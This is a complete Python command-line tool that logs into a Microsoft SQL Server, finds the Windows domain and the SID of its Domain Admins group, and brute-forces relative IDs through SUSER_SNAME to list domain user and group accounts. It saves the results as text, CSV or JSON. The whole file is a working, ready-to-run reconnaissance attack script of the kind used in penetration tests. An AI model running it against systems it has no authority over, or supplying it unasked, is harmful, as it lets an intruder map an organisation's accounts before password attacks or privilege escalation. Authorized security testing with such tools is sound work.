#!/usr/bin/env python3

import pymssql
import struct
import sys
import time
import binascii
import argparse
import json
import csv

def parse_arguments():
    parser = argparse.ArgumentParser(description="MSSQL RID brute-force script")
    parser.add_argument('--server', '-s', required=True, help='MSSQL server address')
    parser.add_argument('--username', '-u', required=True, help='MSSQL username')
    parser.add_argument('--password', '-p', required=True, help='MSSQL password')
    parser.add_argument('--database', '-d', default='master', help='Database to connect to (default: master)')
    parser.add_argument('--port', '-P', type=int, default=1433, help='MSSQL server port (default: 1433)')
    parser.add_argument('--start', type=int, default=500, help='Start of RID range (default: 500)')
    parser.add_argument('--end', type=int, default=2000, help='End of RID range (default: 2000)')
    parser.add_argument('--delay', type=float, default=0.0, help='Delay between requests in seconds (default: 0)')
    parser.add_argument('--output', '-o', help='Output file path')
    parser.add_argument('--output-format', choices=['text', 'csv', 'json'], default='text', help='Output format (default: text)')
    return parser.parse_args()

def connect_to_mssql(server, username, password, database, port):
    try:
        conn = pymssql.connect(
            server=server,
            user=username,
            password=password,
            database=database,
            port=port
        )
        return conn
    except Exception as e:
        print(f"[!] Failed to connect to MSSQL: {e}")
        sys.exit(1)

def sid_to_str(sid_hex):
    if sid_hex.startswith('0x') or sid_hex.startswith('0X'):
        sid_hex = sid_hex[2:]
    sid_bytes = bytes.fromhex(sid_hex)

    revision = sid_bytes[0]
    sub_authority_count = sid_bytes[1]
    identifier_authority = sid_bytes[2:8]
    sub_authorities = []

    for i in range(sub_authority_count):
        start = 8 + i * 4
        end = start + 4
        sub_auth = int.from_bytes(sid_bytes[start:end], byteorder='little')
        sub_authorities.append(sub_auth)

    id_auth_value = int.from_bytes(identifier_authority, byteorder='big')
    if id_auth_value >= 2**32:
        id_auth_str = '0x' + identifier_authority.hex()
    else:
        id_auth_str = str(id_auth_value)
    sid_str = f'S-{revision}-{id_auth_str}'
    for sub_auth in sub_authorities:
        sid_str += f'-{sub_auth}'
    return sid_str

def find_domain(cursor):
    query = "SELECT DEFAULT_DOMAIN()"
    cursor.execute(query)
    result = cursor.fetchone()
    if result:
        return result[0]
    return None

def find_sid(cursor, domain):
    query = f"SELECT master.dbo.fn_varbintohexstr(SUSER_SID('{domain}\\Domain Admins'))"
    cursor.execute(query)
    result = cursor.fetchone()
    if result and result[0]:
        sid_hex_with_prefix = result[0] 
        sid_hex = sid_hex_with_prefix[2:-8]
        sid_str = sid_to_str(sid_hex)
        # We'll use the full SID hex (including '0x'), but without the RID, for queries
        sid_query = sid_hex_with_prefix[:-8]
        return sid_query, sid_str
    return None, None

def brute_force_rids(cursor, sid_query, start=500, end=2000, delay=0.0):
    found_accounts = []
    for rid in range(start, end):
        sys.stdout.write(f"\r[*] Checking RID {rid}" + " " * 20)
        sys.stdout.flush()

        rid_hex = binascii.hexlify(struct.pack("<I", rid)).decode()
        query = f"SELECT SUSER_SNAME({sid_query}{rid_hex})"

        try:
            cursor.execute(query)
            result = cursor.fetchone()
            if result and result[0]:
                account_name = result[0]
                print(f"\r[+] Found account [{rid:05d}]  {account_name}" + " " * 20)
                found_accounts.append({'RID': rid, 'Account': account_name})
        except Exception as e:
            pass

        if delay > 0.0:
            time.sleep(delay)

    return found_accounts

def main():
    args = parse_arguments()

    print("[*] Connecting to MSSQL server...")
    conn = connect_to_mssql(
        server=args.server,
        username=args.username,
        password=args.password,
        database=args.database,
        port=args.port
    )
    cursor = conn.cursor()

    print("[*] Discovering domain...")
    domain = find_domain(cursor)
    if domain:
        print(f"[+] Found domain: {domain}")
    else:
        print("[!] Failed to discover domain.")
        sys.exit(1)

    print("[*] Discovering domain SID...")
    sid_query, sid_str = find_sid(cursor, domain)
    if sid_query:
        print(f"[+] Found SID for {domain}: {sid_str}")
    else:
        print("[!] Failed to discover SID.")
        sys.exit(1)

    print("[*] Starting RID brute-force...")
    found_accounts = brute_force_rids(
        cursor,
        sid_query,
        start=args.start,
        end=args.end,
        delay=args.delay
    )

    cursor.close()
    conn.close()
    print("\n[*] Brute-force complete.")

    if args.output_format == 'text':
        output_lines = []
        for account in found_accounts:
            output_lines.append(f"[+] Found account [{account['RID']:05d}]  {account['Account']}")
        output_data = '\n'.join(output_lines)
    elif args.output_format == 'csv':
        output_lines = []
        output_lines.append('RID,Account')
        for account in found_accounts:
            output_lines.append(f"{account['RID']},{account['Account']}")
        output_data = '\n'.join(output_lines)
    elif args.output_format == 'json':
        output_data = json.dumps(found_accounts, indent=4)
    else:
        output_data = ''

    if args.output:
        with open(args.output, 'w') as f:
            f.write(output_data)
        print(f"[*] Results saved to {args.output}")
    else:
        print(output_data)

if __name__ == "__main__":
    main()
